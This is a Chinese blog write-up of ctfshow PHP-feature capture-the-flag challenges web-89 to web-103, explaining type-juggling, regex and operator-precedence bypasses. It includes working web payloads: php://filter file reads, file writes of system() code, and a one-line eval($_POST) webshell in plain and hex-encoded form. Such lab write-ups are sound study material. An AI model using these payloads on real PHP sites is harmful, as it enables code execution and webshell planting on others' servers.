---
title: ctfshow php特性
date: 2024-10-08 20:08:38
tags: 
      - php特性
      - ctfshow
categories: 学习笔记
---

### web-php特性

**url传入的数值都默认为字符串**

### web-89

重点在于绕过preg_match函数，且num是个int类型的数字

我们可以通过数组进行绕过，就得到了flag

<!--more-->

![image-20240409152647713](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091526769.png)

------

### web-90

这题考察intval()函数和强比较

**强比较**

在php中，三个等号“===”是全等比较运算符，用于比较两个操作数的值是否相等，同时检测它们的类型

是否相同；只有两边的值和数据类型都相等时，运算结果才是TRUE。

这题传入num=4476a，原因是如果base=0时，当intval遇到字母，会自动停止

![image-20240409153622847](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091536900.png)

------

### web-91

考察preg_match()和正则表达式

![image-20240409154242409](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091542431.png)

第一层由于/m存在为多行匹配，第二层为单行匹配，要想通过第一层且绕过第二层，我们使用换行绕过

传入**cmd=%0Aphp**就可以了，**%0A为换行符的url编码**

这样传入的数就变成了：

```
		//第一行为空格
php		//第二行为php
```

就能拿到flag了



------

### web-92

这道题考察的是intval函数和弱类型比较

但如果我们传入的num为4476a的话，

```
if($num==4476){
    die("no no no!");
  }
```

这层代码就会返回true，因此想要绕过这层代码同时使

下面这层代码成立，我们可以使用进制转换，intval会自动将字符串转换成指定的进制，且返回int类型

```
if(intval($num,0)==4476){
    echo $flag;
  }else{
    echo intval($num,0);
  }
```

因此我们可以传入num=0x117c来获得flag

![image-20240409160207822](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091602933.png)



------

### **web-93**

这题和上题一样，但限制了字母，因此二进制，十六进制就不可以用了，但八进制没有被过滤掉

所以传入num=010574就能拿到flag了

![image-20240409160816719](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091608812.png)

------

### web-94

得了，这道题由于strpos的存在，过滤掉了开头的0（还可以在数据前填个+号，这样0就不是第一位了）

，但我们发现$num==="4476"是个强类型比较，我们就可以传入num=4476.0，因为url传入的默认是字符串，所以这个强类型比较返回false，然后就能一路拿到flag了

```
?num= 010574
?num=4476.0
?num=+010574
```

![image-20240409161434098](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091614175.png)

------

### web-95

把点过滤了，不过还是能在前面加空格、换行或者加减号.

```php
?num= 010574
?num=%0a010574
?num=+010574
```

![image-20240409213427619](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092134708.png)

------

### web-96

可以用php伪协议来做

传入?u=php://filter/convert.base64-encode/resource=flag.php

![image-20240409213931618](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092139703.png)

会得到一串base64编码，再通过解码就能得到flag

![image-20240409214016225](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092140263.png)

其它payload

```
./flag.php                            相对路径
/var/www/html/flag.php                绝对路径
php://filter/resource=flag.php        php伪协议 
php://filter/read=convert.base64-encode/resource=flag.php

```

------

### web-97

![image-20240409214614357](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092146409.png)

利用md5不能识别数组，且返回false来绕过md5得到flag



------

### web-98

![image-20240409215230746](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092152768.png)

解释一下\$_GET?$_GET=&$_POST:'flag';

如果get传入了一个值，就要用post传入的值覆盖掉,否则get传不进去

highlight_file(\$_GET['HTTP_FLAG']=='flag'?$flag:\__FILE__);

如果HTTP_FLAG通过get方式传入一个flag，就打开flag这个文件

所以POST：HTTP_FLAG=flag；GET随便传什么都行.

![image-20240409215642596](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092156711.png)

------

### web-99

```
highlight_file(__FILE__);
$allow = array();                //设置为数组
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));        //向数组里面插入随机数
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}
 
?> 
```

函数in_array()第三个参数

is_array()可以判断一个值是否在数组中。

in_array(value,array,type) value ：要搜索的值

array ： 被搜索的数组

type ： 类型，true全等 ，false非全等（默认）

file_put_contents() 函数把一个字符串写入文件中。f

语法：

```
int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )
filename： 必需。规定要写入数据的文件。 如果文件不存在，则创建一个新文件。 data： 必需。规定要写入文件的数据。可以是字符串、数组或数据流。
```

GET传入n=1.php

这题file_put_contents() 函数没有设置第三个参数，所以1.php和数字1比较时，1.php会转化为1再和1比较， 满足条件.

接着POST：content=<?php system("ls");?> 传入php代码到1.php中，然后访问1.php发现flag


查看flag，POST：content=<?php system("tac flag36d.php");?>

![image-20240410192315875](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404101923040.png)



### web-100

这题考察运算符的优先级

```
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
```

由于=的优先级大于and，因此只要满足v1是个数字，v0就返回1

```
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
}
```

通过代码审计，v2不能存在；，而v3要存在一个；且在开头

我们可以用highlight_file()返回ctfshow.php中的内容

?v1=1&v2=highlight_file("ctfshow.php")&v3=;

![image-20240410204709521](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404102047602.png)

我们得到flag为a2eae7f30x2d8dc90x2d45560x2dad910x2d629eccb9bba4，接下来把0x2d换成-就能得到flag了



也可以传入?v1=1&v2=eval($_POST[1])?%3E&v3=; 传入一句话木马，然后使用蚁剑进行连接

------

### web-101

这题考察反射和运算符的优先级

```
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
```

根据上题的经验，我们可以知道v1=1,

由于v2,v3过滤了数字和特殊字符

![image-20240411193416613](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404111934695.png)

因此，这题我们考虑用ReflectionClass反射，

我们传入?v1=1&v2=echo new RefectionClass&v3=;

我们就能拿到flag值了

![image-20240411193542061](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404111935095.png)

我们把0x2d换成-，得到flag{6feae7fe-d7cd-4fea-9d47-30b0e0ee2be}，但当我们提交flag时，却提示我们flag错误，经过仔细对比，我们发现flag少了一位

我们可以手动爆破或通过bp，猜flag的最后一位（不演示了）

------

### web-102

考察call_user_func函数和php版本特性

```
$a='<?=`cat *`;';       //为什么用这个，主要是因为编码后带e,或者是编码后全部是数字
$b=base64_encode($a);  // PD89YGNhdCAqYDs=
$c=bin2hex($b);      //这里直接用去掉=的base64
//输出   5044383959474e6864434171594473
带e会被当做科学计数法，而base64去掉等号，不影响解码
bin2hex把ascii码转为16进制

payload：
php5中is_numeric函数认识16进制数，而php7这个函数不识别16进制数，
hex2bin将16进制转换为ascii码，<?php eval($_POST[1]);?>的16进制编码为

0x3c3f706870206576616c28245f504f53545b315d293b3f3e
php5:
v2=0x3c3f706870206576616c28245f504f53545b315d293b3f3e&v3=1.php
post:v1=hex2bin
之后访问1.php

php7:
v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php 
post: v1=hex2bin
需要随便填充一些数字，从第二个字符开始截取的(也就是第三个，是从0开始的)
之后访问1.php

```

------



### web-103

跟上题做法一模一样

------

### web-104
